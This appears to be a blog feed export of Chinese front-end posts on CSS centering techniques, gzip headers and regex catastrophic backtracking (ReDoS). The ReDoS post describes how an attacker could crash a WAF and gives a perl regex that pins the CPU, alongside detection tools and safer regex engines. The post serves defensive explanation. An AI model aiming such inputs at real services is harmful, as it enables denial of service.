<h3 id="4-浮动元素水平居中"><a href="#4-浮动元素水平居中" class="headerlink" title="4.浮动元素水平居中"></a>4.浮动元素水平居中</h3><ul>
<li><p>  对于定宽的浮动元素，通过子元素设置relative + 负margin</p>
</li>
<li><p>  对于不定宽的浮动元素，父子容器都用相对定位</p>
</li>
<li><p>  通用方法(不管是定宽还是不定宽)：flex布局</p>
</li>
</ul>
<h4 id="①定宽的非浮动元素"><a href="#①定宽的非浮动元素" class="headerlink" title="①定宽的非浮动元素"></a>①定宽的非浮动元素</h4><p><strong>通过子元素设置relative + 负margin,原理见下图：</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-54c64bc2001f49e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>注意：样式设置在浮动元素本身</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.child &#123;</span><br><span class="line">   position:relative;</span><br><span class="line">   left:50%;</span><br><span class="line">   margin-left:-250px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">  &lt;span class&#x3D;&quot;child&quot; style&#x3D;&quot;float: left;width: 500px;&quot;&gt;我是要居中的浮动元素&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<h4 id="②不定宽的浮动元素"><a href="#②不定宽的浮动元素" class="headerlink" title="②不定宽的浮动元素"></a>②不定宽的浮动元素</h4><p>通过父子容器都相对定位，偏移位移见下图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9797f21bfeb68368?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><strong>注意：要清除浮动，给外部元素加上float。这里的父元素就是外部元素</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;box&quot;&gt; </span><br><span class="line">    &lt;p&gt;我是浮动的&lt;&#x2F;p&gt; </span><br><span class="line">    &lt;p&gt;我也是居中的&lt;&#x2F;p&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">.box&#123; </span><br><span class="line">    float:left; </span><br><span class="line">    position:relative; </span><br><span class="line">    left:50%; </span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">    float:left;</span><br><span class="line">    position:relative;</span><br><span class="line">    right:50%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="③通用办法flex布局-不管是定宽还是不定宽"><a href="#③通用办法flex布局-不管是定宽还是不定宽" class="headerlink" title="③通用办法flex布局(不管是定宽还是不定宽)"></a>③通用办法flex布局(不管是定宽还是不定宽)</h4><p><strong>利用弹性布局(flex)的<code>justify-content</code>属性，实现水平居中</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> .parent &#123; </span><br><span class="line">    display:flex; </span><br><span class="line">    justify-content:center; </span><br><span class="line">&#125; </span><br><span class="line">.chlid&#123; </span><br><span class="line">    float: left; </span><br><span class="line">    width: 200px;&#x2F;&#x2F;有无宽度不影响居中 </span><br><span class="line">&#125; </span><br><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">  &lt;span class&#x3D;&quot;chlid&quot;&gt;我是要居中的浮动元素&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<h3 id="5-绝对定位元素水平居中"><a href="#5-绝对定位元素水平居中" class="headerlink" title="5.绝对定位元素水平居中"></a>5.绝对定位元素水平居中</h3><p>这种方式非常独特，<strong>通过子元素绝对定位，外加<code>margin: 0 auto</code>来实现</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&lt;div class&#x3D;&quot;parent&quot;&gt; 2    &lt;div class&#x3D;&quot;child&quot;&gt;让绝对定位的元素水平居中对齐。&lt;&#x2F;div&gt; 3&lt;&#x2F;div&gt; 4  .parent&#123; 5        position:relative; 6    &#125; 7   .child&#123; 8         position: absolute; &#x2F;*绝对定位*&#x2F; 9         width: 200px;10         height:100px;11         background: yellow;12         margin: 0 auto; &#x2F;*水平居中*&#x2F;13         left: 0; &#x2F;*此处不能省略，且为0*&#x2F;14         right: 0;&#x2F;*此处不能省略，且为0*&#x2F;15    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="二、垂直居中"><a href="#二、垂直居中" class="headerlink" title="二、垂直居中"></a>二、垂直居中</h2><h3 id="1-单行内联元素垂直居中"><a href="#1-单行内联元素垂直居中" class="headerlink" title="1.单行内联元素垂直居中"></a>1.单行内联元素垂直居中</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div id&#x3D;&quot;box&quot;&gt; </span><br><span class="line">     &lt;span&gt;单行内联元素垂直居中。&lt;&#x2F;span&gt;。 </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line"> #box &#123; </span><br><span class="line">    height: 120px; </span><br><span class="line">    line-height: 120px; </span><br><span class="line">    border: 2px dashed #f69c55; </span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-多行内联元素垂直居中"><a href="#2-多行内联元素垂直居中" class="headerlink" title="2.多行内联元素垂直居中"></a>2.多行内联元素垂直居中</h3><h4 id="①利用flex布局（flex）"><a href="#①利用flex布局（flex）" class="headerlink" title="①利用flex布局（flex）"></a>①利用flex布局（flex）</h4><p><strong>利用flex布局实现垂直居中，其中flex-direction: column定义主轴方向为纵向</strong>。这种方式在较老的浏览器存在兼容性问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt; </span><br><span class="line">   &lt;p&gt;Dance like nobody is watching, code like everybody is.   </span><br><span class="line">     Dance like nobody is watching, code like everybody is.         </span><br><span class="line">     Dance like nobody is watching, code like everybody is.&lt;&#x2F;p&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">    .parent &#123;  </span><br><span class="line">        height: 140px; </span><br><span class="line">        display: flex;</span><br><span class="line">        flex-direction: column;</span><br><span class="line">        justify-content: center;</span><br><span class="line">        border: 2px dashed #f69c55;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-38b6311e54762151.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="afve5-tqaog.jpg"></p>
<h4 id="②利用表布局（table）"><a href="#②利用表布局（table）" class="headerlink" title="②利用表布局（table）"></a>②利用表布局（table）</h4><p><strong>利用表布局的vertical-align: middle可以实现子元素的垂直居中</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt;     &lt;p class&#x3D;&quot;child&quot;&gt;The more technology you learn, the more you realize how little you know.     The more technology you learn, the more you realize how little you know.     The more technology you learn, the more you realize how little you know.&lt;&#x2F;p&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line"> &lt;style&gt; </span><br><span class="line">    .parent &#123; </span><br><span class="line">        display: table;         </span><br><span class="line">        height: 140px;</span><br><span class="line">        border: 2px dashed #f69c55;</span><br><span class="line">    &#125;</span><br><span class="line">    .child &#123;</span><br><span class="line">        display: table-cell;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-块级元素垂直居中"><a href="#3-块级元素垂直居中" class="headerlink" title="3 块级元素垂直居中"></a>3 块级元素垂直居中</h3><h4 id="①使用absolute-负margin-已知高度宽度"><a href="#①使用absolute-负margin-已知高度宽度" class="headerlink" title="①使用absolute+负margin(已知高度宽度)"></a>①使用absolute+负margin(已知高度宽度)</h4><p><strong>通过绝对定位元素距离顶部50%，并设置margin-top向上偏移元素高度的一半，就可以实现了</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt; </span><br><span class="line">    &lt;div class&#x3D;&quot;child&quot;&gt;固定高度的块级元素垂直居中。&lt;&#x2F;div&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">.parent &#123; </span><br><span class="line">        position: relative; </span><br><span class="line">&#125; </span><br><span class="line">.child &#123; </span><br><span class="line">        position: absolute; </span><br><span class="line">        top: 50%;</span><br><span class="line">        height: 100px;</span><br><span class="line">        margin-top: -50px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="②使用absolute-transform"><a href="#②使用absolute-transform" class="headerlink" title="②使用absolute+transform"></a>②使用absolute+transform</h4><p><strong>当垂直居中的元素的高度和宽度未知时，可以借助CSS3中的transform属性向Y轴反向偏移50%的方法实现垂直居中</strong>。但是部分浏览器存在兼容性的问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt; </span><br><span class="line">    &lt;div class&#x3D;&quot;child&quot;&gt;未知高度的块级元素垂直居中。&lt;&#x2F;div&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">.parent &#123; </span><br><span class="line">        position: relative; </span><br><span class="line">&#125; </span><br><span class="line">.child &#123; </span><br><span class="line">        position: absolute; </span><br><span class="line">        top: 50%;</span><br><span class="line">        transform: translateY(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="③使用flex-align-items"><a href="#③使用flex-align-items" class="headerlink" title="③使用flex+align-items"></a>③使用flex+align-items</h4><p><strong>通过设置flex布局中的属性align-items，使子元素垂直居中</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;child&quot;&gt;未知高度的块级元素垂直居中。&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">.parent &#123;</span><br><span class="line">    display:flex;</span><br><span class="line">    align-items:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="④使用table-cell-vertical-align"><a href="#④使用table-cell-vertical-align" class="headerlink" title="④使用table-cell+vertical-align"></a>④使用table-cell+vertical-align</h4><p><strong>通过将父元素转化为一个表格单元格显示（类似 <code>&lt;td&gt;</code> 和 <code>&lt;th&gt;</code>），再通过设置 <code>vertical-align</code>属性，使表格单元格内容垂直居中。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;Demo&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .parent &#123;</span><br><span class="line">    display: table-cell;</span><br><span class="line">    vertical-align: middle;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="三、水平垂直居中"><a href="#三、水平垂直居中" class="headerlink" title="三、水平垂直居中"></a>三、水平垂直居中</h2><p>这种情形也是有多种实现方式，接下去我们娓娓道来：</p>
<h3 id="方法1：绝对定位与负边距实现（已知高宽）"><a href="#方法1：绝对定位与负边距实现（已知高宽）" class="headerlink" title="方法1：绝对定位与负边距实现（已知高宽）"></a>方法1：绝对定位与负边距实现（已知高宽）</h3><p><strong>这种方式需要知道被垂直居中元素的高和宽，才能计算出margin值，兼容所有浏览器</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; css部分 </span><br><span class="line"> #container &#123;</span><br><span class="line">      position: relative; </span><br><span class="line">    &#125; </span><br><span class="line"> #center &#123; </span><br><span class="line">      position: absolute; </span><br><span class="line">      top: 50%; </span><br><span class="line">      left: 50%; </span><br><span class="line">      margin: -50px 0 0 -50px;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; html部分(这部分不做变化,下面例子直接共用)</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id&#x3D;&#39;container&#39;&gt;</span><br><span class="line">    &lt;div id&#x3D;&#39;center&#39; style&#x3D;&quot;width: 100px;height: 100px;background-color: #666&quot;&gt;center&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<h3 id="方法2：绝对定位-margin-auto（已知高宽）"><a href="#方法2：绝对定位-margin-auto（已知高宽）" class="headerlink" title="方法2：绝对定位+margin:auto（已知高宽）"></a>方法2：绝对定位+margin:auto（已知高宽）</h3><p><strong>这种方式无需知道被垂直居中元素的高和宽，但不能兼容低版本的IE浏览器。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #container &#123; </span><br><span class="line">      position: relative; </span><br><span class="line">      height:100px;&#x2F;&#x2F;必须有个高度 </span><br><span class="line"> &#125; </span><br><span class="line">#center &#123; </span><br><span class="line">     position: absolute; </span><br><span class="line">      top: 0; </span><br><span class="line">     left: 0; </span><br><span class="line">      right: 0;</span><br><span class="line">      bottom: 0;</span><br><span class="line">      margin: auto;&#x2F;&#x2F;注意此处的写法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法3：绝对定位-CSS3-未知高宽"><a href="#方法3：绝对定位-CSS3-未知高宽" class="headerlink" title="方法3：绝对定位+CSS3(未知高宽)"></a>方法3：绝对定位+CSS3(未知高宽)</h3><p><strong>利用Css3的transform，可以轻松的在未知元素的高宽的情况下实现元素的垂直居中</strong>。<br>CSS3的transform固然好用，但在项目的实际运用中必须考虑兼容问题，大量的hack代码可能会导致得不偿失。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #container &#123;</span><br><span class="line">      position: relative;</span><br><span class="line"> &#125;</span><br><span class="line"> #center &#123;</span><br><span class="line">      position: absolute;</span><br><span class="line">      top: 50%;</span><br><span class="line">      left: 50%;</span><br><span class="line">      transform: translate(-50%, -50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="方法4：flex布局"><a href="#方法4：flex布局" class="headerlink" title="方法4：flex布局"></a>方法4：flex布局</h3><p><strong>利用flex布局，其中justify-content 用于设置或检索弹性盒子元素在主轴（横轴）方向上的对齐方式；而align-items属性定义flex子项在flex容器的当前行的侧轴（纵轴）方向上的对齐方式。不能兼容低版本的IE浏览器。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  #container &#123;&#x2F;&#x2F;直接在父容器设置即可</span><br><span class="line">     height: 100vh;&#x2F;&#x2F;必须有高度</span><br><span class="line">     display: flex;</span><br><span class="line">      justify-content: center;</span><br><span class="line">     align-items: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法5：flex-grid与margin-auto-最简单写法"><a href="#方法5：flex-grid与margin-auto-最简单写法" class="headerlink" title="方法5：flex/grid与margin:auto(最简单写法)"></a>方法5：flex/grid与margin:auto(最简单写法)</h3><p><strong>容器元素设为 flex 布局或是grid布局，子元素只要写 margin: auto 即可,不能兼容低版本的IE浏览器。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#container &#123;</span><br><span class="line">      height: 100vh;&#x2F;&#x2F;必须有高度      </span><br><span class="line">      display: grid;</span><br><span class="line"> &#125;</span><br><span class="line">#center &#123;</span><br><span class="line">      margin: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-619807040e29cf95?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>写博客是件挺费精力的事，特别是你有想写出一篇好博客的初衷,本文前后花了不止五六个小时，但我却常常乐此不疲！一方面是看了很多博客，自己不手动敲一遍整理一遍，就感觉没掌握一样;另一方面，分享学习心得是件很快乐的事，愿与诸君共同成长进步！如果觉得本文还不错，记得点赞关注喔！因为往往是普通人才最需要别人的鼓励和支持！</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><p>  【基础】这15种CSS居中的方式，你都用过哪几种？</p>
</li>
<li><p>  最全面的水平垂直居中方案与flexbox布局</p>
</li>
<li><p>  CSS3 Flexbox轻巧实现元素的水平居中和垂直居中</p>
</li>
<li><p>  如何居中一个元素（正常、绝对定位、浮动元素)</p>
</li>
<li><p>  <a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651553836&idx=1&sn=1f9e378e61908fd8c6c0fd81810b77fd&chksm=802557edb752defba9f1c2e462f7f09be0d1abbcbbdeb90007b80a6c4a78c855abbb5f291e39&mpshare=1&scene=21&srcid=0320rhs9ftYpIVK7WHOW2BoV#wechat_redirect">CSS布局解决方案（终结版）</a></p>
</li>
<li><p>  水平居中、垂直居中、水平垂直居中、浮动居中、绝对定位居中…….帮你搞定</p>
</li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>如何彻底避免正则表达式的灾难性回溯？</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%A6%82%E4%BD%95%E5%BD%BB%E5%BA%95%E9%81%BF%E5%85%8D%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E7%81%BE%E9%9A%BE%E6%80%A7%E5%9B%9E%E6%BA%AF%EF%BC%9F/</url>
    <content><![CDATA[<p>正则表达式的灾难性回溯（Catastrophic Backtracking）是指，正则在匹配的时候回溯过多，造成 CPU 100%，正常服务被阻塞。</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这里有一篇<a href="https://zhuanlan.zhihu.com/p/38229530">文章</a>详细的描述了一次正则回溯导致 CPU 100% 的发现和解决过程，原文比较长，我之前也在 OpenResty 的开发中遇到过两次类似的问题。</p>
<p>这里简单归纳下，你就可以不用花费时间去了解背景了：</p>
<ol>
<li> 大部分开发语言的正则引擎是用基于回溯的 NFA 来实现（而不是基于 Thompson’s NFA）；</li>
<li> 如果回溯次数过多，就会导致灾难性回溯，CPU 100%；</li>
<li> 需要用 gdb 分析 dump，或者 systemtap 分析线上环境来定位；</li>
<li> 这种问题很难在代码上线前发现，需要逐个 review 正则表达式；</li>
</ol>
<p>站在开发的角度，修复完有问题的正则表达式，就告一段落了。最多再加上一个保险机制，限制下回溯的次数，比如在 OpenResty 中这样设置：</p>
<p><code>lua_regex_match_limit 100000;</code></p>
<p>这样即使出现灾难性回溯，也会被限制住，不会跑满 CPU。</p>
<p>嗯，看上去已经很完美了吗？让我们来跳出开发的层面，用不同的维度来看待这个问题。</p>
<h2 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h2><p>只用一台机器，发送一个请求，就可以打跨对方的服务器，这简直就是黑客梦寐以求的核武器。与之相比，什么 DDoS 弱爆了，动静大还花钱多。</p>
<p>这种攻击也有自己的名字：**ReDoS (RegEx Denial of Service)**。</p>
<p>由于正则表达式应用非常广泛，几乎存在于后端服务的各个部分，所以只要找到其中一个漏洞，就有机可趁。</p>
<p>试想一个场景，黑客发现了 WAF 中存在 ReDoS 漏洞，发送一个请求打垮了 WAF；你无法在短时间内定位这个问题，<em>甚至意识不到这是一次攻击</em>；为了保证业务的正常，你选择重启或者暂时关闭 WAF；在 WAF 失效期间，黑客利用 SQL 注入，拖走了你的数据库。而你，可能还完全蒙在鼓里。</p>
<p><em>由于开源软件和云服务的广泛使用，只保证自己写的正则表达式没有漏洞，也是不够的</em>。这是另外一个话题了，我们这里先只讨论自己可控范围内的正则。</p>
<h2 id="如何发现这类正则表达式？"><a href="#如何发现这类正则表达式？" class="headerlink" title="如何发现这类正则表达式？"></a>如何发现这类正则表达式？</h2><p><strong>解决问题的第一步，就是发现问题，而且要尽量发现所有问题</strong>，也就是所谓安全的发现能力。</p>
<p>指望人工 code review 来发现有问题的正则，自然是靠不住的。大部分开发者是没有这方面安全意识的，就算有意去找，人也不可能从复杂的正则表达式中找到问题所在。</p>
<p>这正是自动化工具大显身手的时候。</p>
<p>我们有以下两种自动化的方法来解决：</p>
<ul>
<li>  静态检测</li>
</ul>
<p>这类工具可以扫描代码中正则表达式，根据一定的算法，从中找出有灾难性回溯的正则。</p>
<p>比如<em>RXXR2</em>（<a href="https://link.zhihu.com/?target=http://www.cs.bham.ac.uk/%257Ehxt/research/rxxr2/">http://www.cs.bham.ac.uk/%7Ehxt/research/rxxr2/</a>），它是基于一篇 paper 中的算法来实现，把正则转换为ε-NFA，然后再进行搜索，但并不支持正则表达式的扩展语法，所以会有漏报。</p>
<ul>
<li>  动态 fuzzing</li>
</ul>
<p>fuzz 测试是一种通用的软件测试方法，通过长时间输入大量随机的数据，来检测软件是否有崩溃、内存泄漏等问题。</p>
<p>同样的，在正则的测试中我们也可以用到这种方法。我们可以根据已有的正则表达式来生成测试数据，也可以完全随机生成。</p>
<p><em>SlowFuzz</em> 是其中一个开源的工具，也是基于一篇 paper 的算法实现，本文最后会列出 paper，它是一个通用的工具，并没有针对正则的结构做处理，所以会有漏报。</p>
<p><em>SDLFuzzer</em> 是几年前微软开发的一个专门的 ReDoS 检测工具，但已经不再维护了。</p>
<p>这方面的工具可选择的不多，而且关注度不高。不过让我兴奋的是，在搜索资料的过程中，发现了南京大学几位老师和博士关于 ReDoS 的一篇paper，并且和 paper 一起开源了 <strong>ReScue</strong>这个工具： <a href="https://link.zhihu.com/?target=https://2bdenny.github.io/ReScue/">https://2bdenny.github.io/ReScue/</a>。这个工具已经找出了几个开源项目中的 ReDoS 漏洞。</p>
<p>下面是 paper 中对比测试的结果：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f0fcc9c46059705d.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-32003a30f700d785.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h2 id="可否一劳永逸？"><a href="#可否一劳永逸？" class="headerlink" title="可否一劳永逸？"></a>可否一劳永逸？</h2><p>即使我们用了这类工具，有难免会有误报和漏报，那么有没有一劳永逸的方式来解决 ReDoS 呢？</p>
<p>那么我们就要回到<strong>问题产生的根源</strong>去寻找答案：<strong>正则引擎使用了回溯的方式来匹配。</strong></p>
<p>如果我们弃用这种方法，是不是就可以了呢？没错，已经有不少其他的正则引擎的实现，都可以一劳永逸的来解决。他们都<strong>放弃了回溯，用 NFA/DFA 自动机的方法来实现</strong>，优点是适合流式匹配，也更加安全，缺点不支持很多正则的扩展语法，比如 backreferences，好在这些一般也用不到。</p>
<ul>
<li>  Google RE2</li>
</ul>
<p>谷歌的 RE2 是其中完成度比较高开源项目。它支持 PCRE 的大部分语法，而且有 Go、Python、Perl、Node.js 等多种开发语言的库实现，上手和替换成本很低。</p>
<p>我们以 Perl 为例，看下 RE2 是否可以避免灾难性回溯问题。</p>
<p>我们先来看下这个结果对比图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-15ea93dc35cd94c5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>代码如下，感兴趣的可以自己试试看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time perl -e &#39;if (&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; &#x3D;~ &#x2F;a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x2F;) &#123;print(&quot;hit&quot;);&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><code>40.80s user 0.00s system 99% cpu 40.800 total</code></p>
<p>需要 40.8 秒才能跑完这个正则，期间 CPU 99%。</p>
<p>采用 RE2 之后，对比非常明显：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time perl -e &#39;use re::engine::RE2; if (&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; &#x3D;~ &#x2F;a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x2F;) &#123;print(&quot; hit&quot;);&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><code>perl -e 0.00s user 0.00s system 34% cpu 0.011 total</code></p>
<ul>
<li>  Intel Hyperscan</li>
</ul>
<p>Intel Hyperscan 也是类似 RE2 的正则引擎，也有Perl、Python 等语言的库，上手难度不大。</p>
<p>只不过按照 Intel 的惯例，多了平台的绑定，只能跑在 x86 中。</p>
<p>如果非要说有什么独特的好处，可能是能够和 Intel 的指令集还有硬件更好的配合，有性能的提升，比如结合下自家的 DPDK。</p>
<p>开源的网络入侵检测工具 Snort，也用 Hyperscan 替换了之前的正则引擎，熟悉 Snort 的同学可以试试看。</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><blockquote>
<p>这里有几篇正则表达式方面的 paper，感兴趣的可以作为扩展阅读。</p>
<ol>
<li> SlowFuzz: Automated Domain-Independent Detection of Algorithmic Complexity Vulnerabilities： <a href="https://link.zhihu.com/?target=https://arxiv.org/pdf/1708.08437.pdf">https://arxiv.org/pdf/1708.08437.pdf</a></li>
<li> Static Analysis for Regular Expression Exponential Runtime via Substructural Logics：<a href="https://link.zhihu.com/?target=http://www.cs.bham.ac.uk/%257Ehxt/research/redos_full.pdf">http://www.cs.bham.ac.uk/%7Ehxt/research/redos_full.pdf</a></li>
<li> ReScue: Crafting Regular Expression DoS Attacks：<a href="https://link.zhihu.com/?target=https://cs.nju.edu.cn/changxu/1_publications/ASE18.pdf">https://cs.nju.edu.cn/changxu/1_publications/ASE18.pdf</a></li>
<li> Regular Expression Matching Can Be Simple And Fast： <a href="https://link.zhihu.com/?target=https://swtch.com/~rsc/regexp/regexp1.html">https://swtch.com/~rsc/regexp/regexp1.html</a></li>
</ol>
</blockquote>
<blockquote>
<p>转载 ：<a href="https://zhuanlan.zhihu.com/p/44425997">https://zhuanlan.zhihu.com/p/44425997</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>开发人员在线速查手册</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%9C%A8%E7%BA%BF%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<p>不管你是多么优秀的程序员，你都不可能记住一切。在你编写程序的过程中碰到问题需要查阅手册的时候，若有现成的在线手册可参考则可以为你节省很多时间。为了方便各位朋友，向大家推荐一个非常棒的在线手册索引网站——<a href="http://overapi.com/">overapi.com</a>，这个网站收集了众多对开发人员非常有用的手册。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-bd3e11eb7a95a19d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>探索HTTP传输中gzip压缩</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%8E%A2%E7%B4%A2HTTP%E4%BC%A0%E8%BE%93%E4%B8%ADgzip%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<h3 id="为什么要开启gZip"><a href="#为什么要开启gZip" class="headerlink" title="为什么要开启gZip"></a>为什么要开启gZip</h3><p>我们给某人发送邮件时，我们在传输之前把自己的文件压缩一下，接收方收到文件后再去解压获取文件。这中操作对于我们来说都已经司空见惯。我们压缩文件的目的就是为了把传输文件的体积减小，加快传输速度。我们在 <code>http</code> 传输中开启 <code>gZip</code> 的目的也是如此，但是一般文章介绍 <code>gZip</code> 时候总是结合一些服务端配置(<code>nginx</code>)或者构建工具插件(<code>webpack</code>)来说，列出一大堆配置让人看的云里雾里，以至于到最后还没搞懂 <code>为什么用</code>，<code>怎么用</code> 这些问题。</p>
<h3 id="http-与-gZip"><a href="#http-与-gZip" class="headerlink" title="http 与 gZip"></a>http 与 gZip</h3><p>我们下面去探讨一下这些问题</p>
<h4 id="gZip-文件怎么通讯"><a href="#gZip-文件怎么通讯" class="headerlink" title="gZip 文件怎么通讯"></a><code>gZip</code> 文件怎么通讯</h4><p>我们传输压缩文件给别人时候一般都带着后缀名 <code>.rar</code>, <code>.zip</code>之类，对方在拿到文件后根据相应的后缀名选择不同的解压方式然后去解压文件。我们在 <code>http</code> 传输时候解压文件的这个角色的扮演者就是我们使用的浏览器，但是浏览器怎么分辨这个文件是什么格式，应该用什么格式去解压呢？</p>
<p>在 <code>http／1.0</code> 协议中关于服务端发送的数据可以配置一个 <code>Content-Encoding</code> 字段，这个字段用于说明数据的压缩方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>

<p>客户端在接受到返回的数据后去检查对应字段的信息，然后根据对应的格式去做相应的解码。客户端在请求时，可以用 <code>Accept-Encoding</code> 字段说明自己接受哪些压缩方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>

